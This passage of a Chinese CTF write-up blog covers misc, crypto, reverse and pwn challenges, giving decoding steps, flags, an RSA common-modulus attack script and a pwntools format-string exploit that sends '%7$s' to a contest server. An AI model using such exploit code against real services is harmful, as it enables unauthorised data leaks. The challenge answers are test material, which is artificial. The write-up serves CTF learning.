class="hljs-number">48424756515243574</span>d<span class="hljs-number">355</span>a<span class="hljs-number">464</span>d<span class="hljs-number">3543474</span>a<span class="hljs-number">593</span>d<span class="hljs-number">3</span>d<span class="hljs-number">3</span>d<span class="hljs-number">3</span>d<span class="hljs-number">3</span>d<span class="hljs-number">3</span>d<br></code></pre></td></tr></table></figure>
<p>十六进制转字符串</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">JZJXG2TGHBFXQVTQOF4WQ5CTGVJGIVJSGF4UYWTVOFLDOWRYOVFWQ3KUGJ4XA2KIKJ5FIU3YKRJDIRKEK5CWS3L2OJAVASSOHBGVQRCWM5ZFM5CGJY</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure>
<p>base32</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode"><span class="hljs-symbol">NSsjf8</span>KxVpqyhtS<span class="hljs-number">5</span>RdU<span class="hljs-number">21</span>yLZuqV<span class="hljs-number">7</span>Z<span class="hljs-number">8</span>uKhmT<span class="hljs-number">2</span>ypiHRzTSxTR<span class="hljs-number">4</span>EDWEimzrAPJ<span class="hljs-symbol">N8</span>MXDVgrVtF<span class="hljs-symbol">N</span><br></code></pre></td></tr></table></figure>
<p>base58</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">YX<span class="hljs-symbol">N1</span>cml<span class="hljs-number">7</span>aV<span class="hljs-number">90</span>aGlua<span class="hljs-number">190</span>aGF<span class="hljs-number">0</span>X<span class="hljs-number">2</span>lzX<span class="hljs-number">3</span><span class="hljs-symbol">NvX2</span>Vhc<span class="hljs-number">3</span>lfZ<span class="hljs-name">m9</span>yX<span class="hljs-number">3</span>lvdX<span class="hljs-number">0</span>=<br></code></pre></td></tr></table></figure>
<p>base64</p>
<figure class="highlight ceylon"><table><tr><td class="code"><pre><code class="hljs ceylon">asuri&#123;i<span class="hljs-number">_</span>think<span class="hljs-number">_</span>that<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>so<span class="hljs-number">_</span>easy<span class="hljs-number">_f</span>or<span class="hljs-number">_</span>you&#125;<br></code></pre></td></tr></table></figure>

<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p>解压有个key.wav文件，应该是密钥<br>audacity频谱看一下，得到密钥<code>MudaMudaMudaMuda</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/medium-1.png"></p>
<p>strings看下图片，发现结尾有一串字符串</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">RjAgOUYgOTkgODMgRjAgOUYgOTIgQjUgRjAgOUYgOEMgQkYgRjAgOUYgOEUgQTQgRjAgOUYgOUEgQUEgRjAgOUYgOEMgOEYgRjAgOUYgOTAgOEUgRjAgOUYgQTUgOEIgRjAgOUYgOUEgQUIgRjAgOUYgOTggODYgRTIgOUMgODUgRjAgOUYgOTggODAgRjAgOUYgQTQgQTMgRTIgOEMgQTggRjAgOUYgOTAgOEQgRTIgOTggODAgRjAgOUYgQTUgOEIgRjAgOUYgOTggODYgRjAgOUYgOTkgODMgRjAgOUYgOEUgODMgRjAgOUYgOTAgOTggRjAgOUYgOEQgOEQgRTIgOTggODIgRjAgOUYgOUEgQUEgRjAgOUYgOEMgQUEgRjAgOUYgOTIgQjUgRjAgOUYgOUEgQTggRTIgOEMgQTggRjAgOUYgOTggODEgRjAgOUYgOTQgQUEgRTIgOUMgOTYgRjAgOUYgOEUgODggRjAgOUYgOEMgOEYgRjAgOUYgOTQgODQgRjAgOUYgOTYgOTAgRjAgOUYgQTYgOTMgRjAgOUYgOEMgOEYgRjAgOUYgOTUgQjkgRjAgOUYgOTggOEQgRjAgOUYgOTEgOEMgRjAgOUYgOEMgODkgRjAgOUYgOTIgQjUgRjAgOUYgOEYgOEUgRjAgOUYgOUEgQUIgRjAgOUYgQTQgQTMgRjAgOUYgOTYgOTAgRjAgOUYgOTIgQTcgRjAgOUYgOEQgOEQgRjAgOUYgOEMgQkYgRjAgOUYgOTggOEQgRjAgOUYgOEQgOEUgRjAgOUYgOUEgQTggRjAgOUYgOTAgOEUgRjAgOUYgOTIgQjUgRjAgOUYgOEMgQkYgRjAgOUYgOEYgQjkgRjAgOUYgOEUgODUgRjAgOUYgOTkgODMgRjAgOUYgOTEgOTEgRjAgOUYgOTggODYgRTIgOTggODMgRjAgOUYgOTAgODUgRjAgOUYgOTUgQjkgRjAgOUYgOTggODcgRjAgOUYgOEYgQjkgRjAgOUYgOEYgQjkgRjAgOUYgOEQgQjUgRjAgOUYgOEUgODggRjAgOUYgOEQgOEUgRjAgOUYgQTQgQTMgRjAgOUYgOTggODEgRjAgOUYgOEQgOEQgRjAgOUYgOUEgQTggRjAgOUYgOEYgQjkgRjAgOUYgOTEgQTMgRjAgOUYgOTQgODQgRjAgOUYgQTQgQTMgRjAgOUYgOEUgODggRjAgOUYgOTggODIgRjAgOUYgOTAgOEQgRTIgOUMgODUgRjAgOUYgOTggODAgIEUyIDlDIDg1IEYwIDlGIDlBIEFBIEYwIDlGIDk4IDhFIEYwIDlGIDk4IDgwIEYwIDlGIDk3IDkyIEYwIDlGIDk3IDkyCg</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure>
<p>base64</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">F0</span> <span class="hljs-number">9</span>F <span class="hljs-number">99</span> <span class="hljs-number">83</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">92</span> B5 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>C BF F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>E A4 F0 <span class="hljs-number">9</span>F <span class="hljs-number">9</span>A AA F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>C <span class="hljs-number">8</span>F F0 <span class="hljs-number">9</span>F <span class="hljs-number">90</span> <span class="hljs-number">8</span>E F0 <span class="hljs-number">9</span>F A5 <span class="hljs-number">8</span>B F0 <span class="hljs-number">9</span>F <span class="hljs-number">9</span>A AB F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">86</span> E2 <span class="hljs-number">9</span>C <span class="hljs-number">85</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">80</span> F0 <span class="hljs-number">9</span>F A4 A3 E2 <span class="hljs-number">8</span>C A8 F0 <span class="hljs-number">9</span>F <span class="hljs-number">90</span> <span class="hljs-number">8</span>D E2 <span class="hljs-number">98</span> <span class="hljs-number">80</span> F0 <span class="hljs-number">9</span>F A5 <span class="hljs-number">8</span>B F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">86</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">99</span> <span class="hljs-number">83</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>E <span class="hljs-number">83</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">90</span> <span class="hljs-number">98</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>D <span class="hljs-number">8</span>D E2 <span class="hljs-number">98</span> <span class="hljs-number">82</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">9</span>A AA F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>C AA F0 <span class="hljs-number">9</span>F <span class="hljs-number">92</span> B5 F0 <span class="hljs-number">9</span>F <span class="hljs-number">9</span>A A8 E2 <span class="hljs-number">8</span>C A8 F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">81</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">94</span> AA E2 <span class="hljs-number">9</span>C <span class="hljs-number">96</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>E <span class="hljs-number">88</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>C <span class="hljs-number">8</span>F F0 <span class="hljs-number">9</span>F <span class="hljs-number">94</span> <span class="hljs-number">84</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">96</span> <span class="hljs-number">90</span> F0 <span class="hljs-number">9</span>F A6 <span class="hljs-number">93</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>C <span class="hljs-number">8</span>F F0 <span class="hljs-number">9</span>F <span class="hljs-number">95</span> B9 F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">8</span>D F0 <span class="hljs-number">9</span>F <span class="hljs-number">91</span> <span class="hljs-number">8</span>C F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>C <span class="hljs-number">89</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">92</span> B5 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>F <span class="hljs-number">8</span>E F0 <span class="hljs-number">9</span>F <span class="hljs-number">9</span>A AB F0 <span class="hljs-number">9</span>F A4 A3 F0 <span class="hljs-number">9</span>F <span class="hljs-number">96</span> <span class="hljs-number">90</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">92</span> A7 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>D <span class="hljs-number">8</span>D F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>C BF F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">8</span>D F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>D <span class="hljs-number">8</span>E F0 <span class="hljs-number">9</span>F <span class="hljs-number">9</span>A A8 F0 <span class="hljs-number">9</span>F <span class="hljs-number">90</span> <span class="hljs-number">8</span>E F0 <span class="hljs-number">9</span>F <span class="hljs-number">92</span> B5 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>C BF F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>F B9 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>E <span class="hljs-number">85</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">99</span> <span class="hljs-number">83</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">91</span> <span class="hljs-number">91</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">86</span> E2 <span class="hljs-number">98</span> <span class="hljs-number">83</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">90</span> <span class="hljs-number">85</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">95</span> B9 F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">87</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>F B9 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>F B9 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>D B5 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>E <span class="hljs-number">88</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>D <span class="hljs-number">8</span>E F0 <span class="hljs-number">9</span>F A4 A3 F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">81</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>D <span class="hljs-number">8</span>D F0 <span class="hljs-number">9</span>F <span class="hljs-number">9</span>A A8 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>F B9 F0 <span class="hljs-number">9</span>F <span class="hljs-number">91</span> A3 F0 <span class="hljs-number">9</span>F <span class="hljs-number">94</span> <span class="hljs-number">84</span> F0 <span class="hljs-number">9</span>F A4 A3 F0 <span class="hljs-number">9</span>F <span class="hljs-number">8</span>E <span class="hljs-number">88</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">82</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">90</span> <span class="hljs-number">8</span>D E2 <span class="hljs-number">9</span>C <span class="hljs-number">85</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">80</span>  E2 <span class="hljs-number">9</span>C <span class="hljs-number">85</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">9</span>A AA F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">8</span>E F0 <span class="hljs-number">9</span>F <span class="hljs-number">98</span> <span class="hljs-number">80</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">97</span> <span class="hljs-number">92</span> F0 <span class="hljs-number">9</span>F <span class="hljs-number">97</span> <span class="hljs-number">92</span><br></code></pre></td></tr></table></figure>
<p>hex转字符</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅😀🤣⌨🐍☀🥋😆🙃🎃🐘🍍☂🚪🌪💵🚨⌨😁🔪✖🎈🌏🔄🖐🦓🌏🕹😍👌🌉💵🏎🚫🤣🖐💧🍍🌿😍🍎🚨🐎💵🌿🏹🎅🙃👑😆☃🐅🕹😇🏹🏹🍵🎈🍎🤣😁🍍🚨🏹👣🔄🤣🎈😂🐍✅😀✅🚪😎😀🗒🗒<br></code></pre></td></tr></table></figure>
<p>emoji-aes,加上密钥<br>解出：flag{AES_1s_Gr3atS0_y0u_L1ke_1t_V3ry_Much}</p>
<h2 id="questionnaire"><a href="#questionnaire" class="headerlink" title="questionnaire"></a>questionnaire</h2><p>问卷调查，答案分别为</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">Naijing</span> University of Aeronautics <span class="hljs-keyword">and</span> Astronautics<br>都缺<br><span class="hljs-symbol">Asuri</span><br>航空航天民航<br>智周万物,道济天下<br>辅导员审核<br>将军路校区<br></code></pre></td></tr></table></figure>
<p>asuri{baigei_h4ve_funnnn}</p>
<h2 id="我们生活在南京（一）——穿越时空的电波"><a href="#我们生活在南京（一）——穿越时空的电波" class="headerlink" title="我们生活在南京（一）——穿越时空的电波"></a>我们生活在南京（一）——穿越时空的电波</h2><p>audacity反转音频，会听到一些英语单词，根据无线电英语字母发音表来写</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%88%91%E4%BB%AC%E7%94%9F%E6%B4%BB%E5%9C%A8%E5%8D%97%E4%BA%AC%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E7%A9%BF%E8%B6%8A%E6%97%B6%E7%A9%BA%E7%9A%84%E7%94%B5%E6%B3%A2.png"></p>
<p><code>RADIOWAVESACROSSTIME</code></p>
<h2 id="Try2FindMe"><a href="#Try2FindMe" class="headerlink" title="Try2FindMe"></a>Try2FindMe</h2><p>比赛的时候用剑龙一直报错，加上快结束了，就没往下看<br>结束后看了wp才知道是<code>magic number</code>的问题<br>赛后复现：</p>
<p>下载得到一个压缩包，binwalk分离出一个压缩包，解压得到一个pyc文件<br>反编译pyc文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">x, cipher</span>):<br>    key = x + <span class="hljs-string">&#x27;n0lve3t6r1s&#x27;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        aes = AES.new(key.rjust(<span class="hljs-number">24</span>, <span class="hljs-string">&#x27;A&#x27;</span>), AES.MODE_ECB)<br>        cipher = binascii.unhexlify(cipher)<br>        flag = aes.decrypt(cipher).decode()<br>        <span class="hljs-keyword">return</span> flag<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    c = <span class="hljs-string">&#x27;29426dfee9b0f158983ad996b0b7a25e3fdf85c3df187b697e3b639c64f452f21c95a941542aa530199083baf296d805&#x27;</span><br>    k = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please input your key: &#x27;</span>)<br>    flag = decrypt(k, c)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wow, you find it!!!&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Oh no!!!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
<p>一个AES加密，但是少了13位密钥</p>
<p>题目给出的hint：<code>pyc 隐写 python 3.7.11</code><br>pyc隐写，先在github上下载<a href="https://github.com/AngelKitty/stegosaurus">剑龙</a></p>
<p>但是剑龙有几个坑要注意：<br>1：要用python3.6运行脚本<br>2：python3.6以下magic number是12个字节；python3.7以上是16个字节</p>
<p>因为github上下载的脚本默认是使用<code>12</code>个字节解密，但是题目中是python3.7的环境，所以当时一直报错<br>我们需要将脚本中第123行的<code>header = f.read(12)</code>改为<code>header = f.read(16)</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Try2FindMe-1.jpg"></p>
<p>运行脚本，得到缺少的密钥<code>k5fgb2eur5sty</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Try2FindMe-2.jpg"></p>
<p>但是在脚本中解密AES是失败的，出题人给出的解释是<code>最后的 AES 跑不出来可能是 python 依赖版本不一样导致锅了，问题不大，找个在线的 AES 解密就行</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Try2FindMe-3.jpg"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>简单写个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">d=<span class="hljs-string">&#x27;oclz&#123;loovyd_vb_l_bvnucd_hqpumj&#125;&#x27;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">if</span> i  <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;&#123;&#125;&quot;</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>            <span class="hljs-keyword">if</span> ((j*<span class="hljs-number">11</span>)%<span class="hljs-number">26</span>)==(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">97</span>):<br>                    e=e+<span class="hljs-built_in">chr</span>(<span class="hljs-number">96</span>+j)<br>                    <span class="hljs-built_in">print</span>(e)<br>                    <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/checkin.png"><br>最后结果加上下划线</p>
<h2 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h2><p>先提取c1、c2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">c2 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.enc2&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read().<span class="hljs-built_in">hex</span>(), <span class="hljs-number">16</span>)<br>c1 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.enc1&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read().<span class="hljs-built_in">hex</span>(), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(c1)<br><span class="hljs-built_in">print</span>(c2)<br></code></pre></td></tr></table></figure>

<p>共模攻击脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> n2s,s2n<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">egcd</span>(<span class="hljs-params">a, b</span>):<br>  <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:<br>    <span class="hljs-keyword">return</span> (b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>  <span class="hljs-keyword">else</span>:<br>    g, y, x = egcd(b % a, a)<br>    <span class="hljs-keyword">return</span> (g, x - (b // a) * y, y)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>  n = <span class="hljs-number">0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L</span><br>  c1 = <span class="hljs-number">409050138400231971554294088177137255457866075540394361465618420085942037334914972271553348781734546381272987423855027216175678797436131073306888763180501523905135583905144901381224572922542735812959826069495112995911282269377230245515683164143316763758642080370867274365360647518283349684822272605576874844625387807047876206532634507258565110299247417968586498427727688356287596783690957837504438650897148190345700044861267114786057049491164836631033845216983588558199652913012590435836646957168387808248342739079479547784004511726635639407815336376908051269831834833967007931321906512831272657668494512124731674031937509111585885992978363095964860952405173714000880231608814695517820595229454266690556749667796735461828114590568954658520700475934939183919597602772428393159957171678913035977611490511885932486154785287709132255326686398261542844030065556598666191350007752712425713619749771672365637485154754564779267050928584728661807027994863116745339833084769533981399300503220638563466169390183736267153617583845250415885823024980144631079997094009230377992595577328633292390530018606442243369688905175147209020920954422003555782869268678894916106413862664953146515732785804502660407314901808581405034432308726147933849979689989</span><br>  c2 = <span class="hljs-number">660786051824910230873884600744959030265388429192727951166721113879854464522389325739802703310913732902833778034401632628938144275110259033918655077691853918758634982899427693594671785857857909036915654998761013827868199342737749405352507276436866364180154665315956829382533710951839019853169966694154970158966072113917267296101513243808003273019100867933714599898053661451818477001562112853209154906322205083636027498233807131522283087979547271774312067398759611022191882371123084261761098923994873110788704960182273817371315264655632343946622563006808101322364265578490109714246148052618988958628592753911496921563155003551926547472410642201974274781280633708636309449501619866376422440041537758514811836133804597783256003504933767151921016752120604258580059668650713822253122650687275054081288622996628277268146723350191531420962242602380839728712825405572549099787290957348706683963946075215806340393267714297975946671488782713260980129229158285210722045502442378445134853897763065681974592818004420357542042894544487694477937617156099760573978759048442186633017206146993595028297257148566673402976005517349438948032707348011387517929999285636559431700923275025083662201127580201286747957827301089492530820945594666308738557238429</span><br>  e1 = <span class="hljs-number">17</span><br>  e2 = <span class="hljs-number">65537</span><br>  s = egcd(e1, e2)<br>  s1 = s[<span class="hljs-number">1</span>]<br>  s2 = s[<span class="hljs-number">2</span>]<br>  <span class="hljs-keyword">if</span> s1&lt;<span class="hljs-number">0</span>:<br>    s1 = - s1<br>    c1 = invert(c1, n)<br>  <span class="hljs-keyword">elif</span> s2&lt;<span class="hljs-number">0</span>:<br>    s2 = - s2<br>    c2 = invert(c2, n)<br>  m = <span class="hljs-built_in">pow</span>(c1,s1,n)*<span class="hljs-built_in">pow</span>(c2,s2,n) % n<br>  <span class="hljs-built_in">print</span> n2s(m)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  main()<br></code></pre></td></tr></table></figure>


<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="IDA-Start"><a href="#IDA-Start" class="headerlink" title="IDA Start"></a>IDA Start</h2><p>ida64打开，shift+F12</p>
<p>flag{St4rt_t0_u3e_IDA}</p>
<h2 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h2><p>IDA分析<br>main函数里面有异或<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Warm%20up-1.png"></p>
<p>然后main函数中先使用某个函数调用了另一个函数<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Warm%20up-2.png"></p>
<p>这个函数中也存在异或<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Warm%20up-3.png"></p>
<p>脚本解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">key=[ <span class="hljs-number">0x56</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x46</span>,<span class="hljs-number">0x54</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x7C</span>,<span class="hljs-number">0x75</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x43</span>,<span class="hljs-number">0x2B</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xFE</span>]<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;qasxcytgsasxcvrefghnrfghnjedfgbhn\x00&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>))<br>str2=[<span class="hljs-number">0</span>]*<span class="hljs-number">34</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">34</span>):<br>    str2[i]=key[i]^(<span class="hljs-number">2</span>*i+<span class="hljs-number">65</span>)<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(str2)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">34</span>):<br>    flag+=<span class="hljs-built_in">chr</span>(str2[i]^<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i]))<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>



<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="format"><a href="#format" class="headerlink" title="format"></a>format</h2><p>通过分析发现flag 放在buf指向的地址处<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/format-1.png"></p>
<p>获取<code>format</code>的偏移 然后计算出<code>buf</code>的偏移</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>n=<span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>	<span class="hljs-keyword">try</span>:<br>		p=process(<span class="hljs-string">&#x27;format&#x27;</span>)<br>		p.sendline(<span class="hljs-string">&#x27;aaaa%&#x27;</span>+<span class="hljs-built_in">str</span>(n)+<span class="hljs-string">&#x27;$p&#x27;</span>)<br>		p.readuntil(<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>		d=p.read()<br>		<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;61616161&#x27;</span> <span class="hljs-keyword">in</span> d:<br>			<span class="hljs-built_in">print</span>(n,d)<br>			<span class="hljs-keyword">break</span><br>		<span class="hljs-built_in">print</span>(d)<br>	<span class="hljs-keyword">except</span>:<br>		<span class="hljs-keyword">pass</span><br>	n=n+<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/nuaa-format-1.png"><br>使用<code>%7$s</code>获取buf指向的地址处储存的数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>n=<span class="hljs-number">8</span><br>p=remote(<span class="hljs-string">&quot;118.195.147.196&quot;</span>,<span class="hljs-number">9185</span>)<br>p.sendline(<span class="hljs-string">&quot;%7$s&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
